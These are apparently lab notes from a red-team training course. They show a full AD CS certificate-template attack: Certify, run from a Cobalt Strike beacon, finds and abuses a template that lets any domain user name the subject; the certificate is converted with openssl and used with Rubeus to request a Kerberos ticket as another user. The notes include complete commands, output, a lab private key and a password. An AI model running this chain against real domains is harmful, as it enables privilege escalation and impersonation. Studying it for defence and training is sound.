AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.

Certify can also find vulnerable templates.

```powershell
[12/11 21:00:50] beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
[12/11 21:00:52] [*] Tasked beacon to run .NET program: Certify.exe find /vulnerable
[12/11 21:00:53] [+] host called home, sent: 283932 bytes
[12/11 21:00:53] [+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=cyberbotic,DC=io'

[*] Listing info about the Enterprise CA 'ca'

    Enterprise CA Name            : ca
    DNS Hostname                  : dc-1.cyberbotic.io
    FullName                      : dc-1.cyberbotic.io\ca
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ca, DC=cyberbotic, DC=io
    Cert Thumbprint               : 95AF7043BD6241CEE92E6DC6CB8D22494E396CCF
    Cert Serial                   : 17DDB078863F61884B680FE6F59211AD
    Cert Start Date               : 8/15/2022 3:42:59 PM
    Cert End Date                 : 8/15/2047 3:52:59 PM

[12/11 21:00:53] [+] received output:
    Cert Chain                    : CN=ca,DC=cyberbotic,DC=io
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               CYBER\Domain Admins           S-1-5-21-2594061375-675613155-814674916-512
      Allow  ManageCA, ManageCertificates               CYBER\Enterprise Admins       S-1-5-21-2594061375-675613155-814674916-519
    Enrollment Agent Restrictions : None

[*] Listing info about the Enterprise CA 'sub-ca'

    Enterprise CA Name            : sub-ca
    DNS Hostname                  : dc-2.dev.cyberbotic.io
    FullName                      : dc-2.dev.cyberbotic.io\sub-ca
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
    Cert Thumbprint               : 697B1C2CD65B2ADC80C3D0CE83A6FB889B0CA08E
    Cert Serial                   : 13000000046EF818036CF8C99F000000000004
    Cert Start Date               : 8/15/2022 4:06:13 PM
    Cert End Date                 : 8/15/2024 4:16:13 PM
    Cert Chain                    : CN=ca,DC=cyberbotic,DC=io -> CN=sub-ca,DC=dev,DC=cyberbotic,DC=io

[12/11 21:00:53] [+] received output:
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               DEV\Domain Admins             S-1-5-21-569305411-121244042-2357301523-512
      Allow  ManageCA, ManageCertificates               CYBER\Enterprise Admins       S-1-5-21-2594061375-675613155-814674916-519
    Enrollment Agent Restrictions : None

[12/11 21:00:54] [+] received output:

[!] Vulnerable Certificates Templates :

    CA Name                               : dc-2.dev.cyberbotic.io\sub-ca
    Template Name                         : CustomUser
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CYBER\Domain Admins           S-1-5-21-2594061375-675613155-814674916-512
                                      CYBER\Domain Users            S-1-5-21-2594061375-675613155-814674916-513
                                      CYBER\Enterprise Admins       S-1-5-21-2594061375-675613155-814674916-519
                                      DEV\Domain Users              S-1-5-21-569305411-121244042-2357301523-513
      Object Control Permissions
        Owner                       : CYBER\Administrator           S-1-5-21-2594061375-675613155-814674916-500
        WriteOwner Principals       : CYBER\Administrator           S-1-5-21-2594061375-675613155-814674916-500
                                      CYBER\Domain Admins           S-1-5-21-2594061375-675613155-814674916-512
                                      CYBER\Enterprise Admins       S-1-5-21-2594061375-675613155-814674916-519
        WriteDacl Principals        : CYBER\Administrator           S-1-5-21-2594061375-675613155-814674916-500
                                      CYBER\Domain Admins           S-1-5-21-2594061375-675613155-814674916-512
                                      CYBER\Enterprise Admins       S-1-5-21-2594061375-675613155-814674916-519
        WriteProperty Principals    : CYBER\Administrator           S-1-5-21-2594061375-675613155-814674916-500
                                      CYBER\Domain Admins           S-1-5-21-2594061375-675613155-814674916-512
                                      CYBER\Enterprise Admins       S-1-5-21-2594061375-675613155-814674916-519



Certify completed in 00:00:01.0021358
```
![[Pasted image 20231211160139.png]]


1. This template is served by _sub-ca_.
2. The template is called _CustomUser_.
3. _ENROLLEE_SUPPLIES_SUBJECT_ is enabled, which allows the certificate requestor to provide any SAN (subject alternative name).
4. The certificate usage has _Client Authenticatio__n_ set.
5. _DEV\Domain Users_ have enrollment rights, so any domain user may request a certificate from this template.

* If a principal you control has WriteOwner, WriteDacl or WriteProperty, then this could also be abused.*


```powershell
[12/11 21:03:15] beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
[12/11 21:03:17] [*] Tasked beacon to run .NET program: Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
[12/11 21:03:17] [+] host called home, sent: 284054 bytes
[12/11 21:03:18] [+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[*] Current user context    : DEV\bfarmer

[12/11 21:03:18] [+] received output:
[*] No subject name specified, using current context as subject.

[*] Template                : CustomUser
[*] Subject                 : CN=Bob Farmer, CN=Users, DC=dev, DC=cyberbotic, DC=io
[*] AltName                 : nlamb

[12/11 21:03:19] [+] received output:

[*] Certificate Authority   : dc-2.dev.cyberbotic.io\sub-ca

[12/11 21:03:20] [+] received output:

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 25

[12/11 21:03:23] [+] received output:

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuzpVVfPcw5RXDM/+GFHQ64TsSQoNJ5dQVpdKubxQ4zr+k7ck
CX5nwld3I+WeJ0fiOyqnzlLgo1/Yu1RjruF2Tyxm9Afc31tE/yvaVZhCIflQUdz3
jRixzgWcgWXKIYmsRxZeJ4mRNBo+ebPqKdF0G43WKAhmlMvCIpRVjUUWUk3yGSxt
7ri40aEfc29JVjuOTs/QnXwTKi89rN/nXTVV6bTmVHEbt7dWXwkf0bfUp/2esUon
Z0VvpBcjC+aynUzXqwZj0Z48rGJ7A35A3GFRsb8iS9QakVu5Hh4mpQXCqI4CYKJg
dMvor0QP1eHBX2QXgiV6J+LpameH/wQxSUD7kQIDAQABAoIBAGXn50DEXfnaCNOB
diUYiyVWESHkJarR8jlfWZ3kwQYdOyl9elDsi189KizQsxdgSeO4YOOtOnXSGm5E
DYnHUBTh7xuOGAs+azyUSt9h40UIpU4Zfmg+87BWX4wSskU04R9ELnVIrE72peCq
K58dURwaRGE/yU3d5cnagQJGg1LCCWmImWaXKpuW5I7v+0ZUts/cqXqWglfWjRRa
ajHQuD06ZBXFdFGc1bnrDFJPNmNIFEw2V+j8MqwBAAtkFlZ5xJCHncMetAC8uW9E
M6jzGB8yoZj4mG8MODKpVrFpNMt26bCCoz4+5jxAhfgv0cFjCdOAHTJBtWdOOVxP
NVV1LX0CgYEA6LslLcBHJJewtaDQAbO328R9sta0Oworhbjmmh3xPyrDIQa6LnJi
sb5TIUyqYQMgmeJ5kuiE3CeHYHVuv96jkXS9QpEvO3u0U/UpnV0tSJeIuvOn5ry3
jEzMy+SPnYouEQWAvZW7F49V/mEUcCQkTFoZgXxNUQyw5A4Mss5KA3cCgYEAzfKD
nb4f0D8ugySyvdNb7/9XMemaIREHxE4H2iccHT+TNVLQNa7n67x8gdRHisczVCpr
tBlUk5I8z71mtF44UeaYJKtxKCKLTSDguJ3oLWZox0Vh96Y/FupLyGgH7H1cSBVV
7WqjGJisJgxcbaKlNpDy8PPgPDtEmQ69Ir406zcCgYBendcbppRF2DXLYbmvN3WE
L3o6/vb/Gb9f+jAmcA3odGYoQyfmQjLFuG7rltOd5TuX1G9Avq9lIdzz5kpETyuI
s0FOkt/0+vHxQDbO91a1sIWyG+Ui9Y5Zx89rBV0t20OnP+l7KiiKB4gahzVb8hWf
xPGhpvt3/ATecqfO+fc1OQKBgC/RnI/W4monEXSv47TBy7oZDrTvKbN90dDZ0Wbs
59E+vr6F4QRl/UG2PS6kDIyDnj5vrxxdOU8eiHIv5xYAPpF9ulvhVt/bzX52INed
CpjoC3IhgRLQjhuTAU+iIBzgKrouAgqjVQVUBby76AYo2rWlyFL8PVee51mmm3Hi
ukTXAoGAcKCRVjLC90melUJb727pgg54i6fNMOG514gw98U8aOHJj7y/REOVDN3p
v8YkJ9jYJwcPvcEOR0IIRfbHfEtiQB8AODRDbrHtm4bGiWXfYB2dTHPWkDcoLqtd
7pQp26N5GdFUxnG74JoWtJeo9j3F7ZWVz49pyRq3wIz/cPgA88k=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGLTCCBRWgAwIBAgITZQAAABlXvw4HWQvO6wAAAAAAGTANBgkqhkiG9w0BAQsF
ADBWMRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMRMwEQYKCZImiZPyLGQBGRYDZGV2MQ8wDQYDVQQDEwZzdWItY2EwHhcNMjMx
MjExMjA1MzIwWhcNMjQwODE1MTYxNjEzWjBqMRIwEAYKCZImiZPyLGQBGRYCaW8x
GjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJvdGljMRMwEQYKCZImiZPyLGQBGRYDZGV2
MQ4wDAYDVQQDEwVVc2VyczETMBEGA1UEAxMKQm9iIEZhcm1lcjCCASIwDQYJKoZI
hvcNAQEBBQADggEPADCCAQoCggEBALs6VVXz3MOUVwzP/hhR0OuE7EkKDSeXUFaX
Srm8UOM6/pO3JAl+Z8JXdyPlnidH4jsqp85S4KNf2LtUY67hdk8sZvQH3N9bRP8r
2lWYQiH5UFHc940Ysc4FnIFlyiGJrEcWXieJkTQaPnmz6inRdBuN1igIZpTLwiKU
VY1FFlJN8hksbe64uNGhH3NvSVY7jk7P0J18EyovPazf5101Vem05lRxG7e3Vl8J
H9G31Kf9nrFKJ2dFb6QXIwvmsp1M16sGY9GePKxiewN+QNxhUbG/IkvUGpFbuR4e
JqUFwqiOAmCiYHTL6K9ED9XhwV9kF4Ileifi6Wpnh/8EMUlA+5ECAwEAAaOCAt4w
ggLaMDsGCSsGAQQBgjcVBwQuMCwGJCsGAQQBgjcVCIek4TiW9z6CzYkYhsi/e4by
hwJMyvEPgpWJLQIBZAIBAzApBgNVHSUEIjAgBggrBgEFBQcDAgYIKwYBBQUHAwQG
CisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQoMCYwCgYI
KwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG9w0BCQ8E
NzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYI
KoZIhvcNAwcwHQYDVR0OBBYEFI53ij3NGiPxg3TO6hRN5lCMfsEqMCAGA1UdEQQZ
MBegFQYKKwYBBAGCNxQCA6AHDAVubGFtYjAfBgNVHSMEGDAWgBS5hbKqSgvID1z0
psmWZ7vLb9A+yjCBwwYDVR0fBIG7MIG4MIG1oIGyoIGvhoGsbGRhcDovLy9DTj1z
dWItY2EsQ049ZGMtMixDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMs
Q049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1jeWJlcmJvdGljLERDPWlv
P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxE
aXN0cmlidXRpb25Qb2ludDCBugYIKwYBBQUHAQEEga0wgaowgacGCCsGAQUFBzAC
hoGabGRhcDovLy9DTj1zdWItY2EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y3liZXJib3Rp
YyxEQz1pbz9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAlnByMomQqrcVmJLl15Zm
7FL8hP2cOSpgasJnC8xkGftgJBTMCPyWKj7rmQlhQNrUqYF0suKsxMbl1HRExxvZ
ktuk+ynmYfW4pKnIdn1U+vO7J/PJwCb4MrlIvzTpycO4t0Is1HM5kWPMPCpMXd4z
7seJr+ONrp7zClpUisSgx+1NfI4rHHvr88mMsq+Toq3Rnx+iQeMCkK+YHHfh4bhr
EJFWoZu+e1AoluG0cEcDzJNqsjQL+EaJSIt3aO/5KbUO2YdKWhsX4Y7smgoUmGqz
KjVG94vYbuMGDoxSyf1X4PWkGwiRYmlHdfi5hX16rPhtOE5hF8f9fJwWOaGwJZBU
/Q==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:05.3599054

```
Copy the whole certificate (both the private key and certificate) and save it to `cert.pem` on Ubuntu WSL.  Then use the provided `openssl` command to convert it to pfx format.
```bash
ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password: pass123
Verifying - Enter Export Password: pass123
```
Convert `cert.pfx` into a base64 encoded string so it can be used with Rubeus
```bash
ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0
MIIM7w[...]ECAggA
```
Then use `asktgt` to request a TGT for the user using the certificate.
```powershell
[12/11 21:10:01] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate: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 /password:pass123 /nowrap
[12/11 21:10:06] [*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:nlamb /certificate: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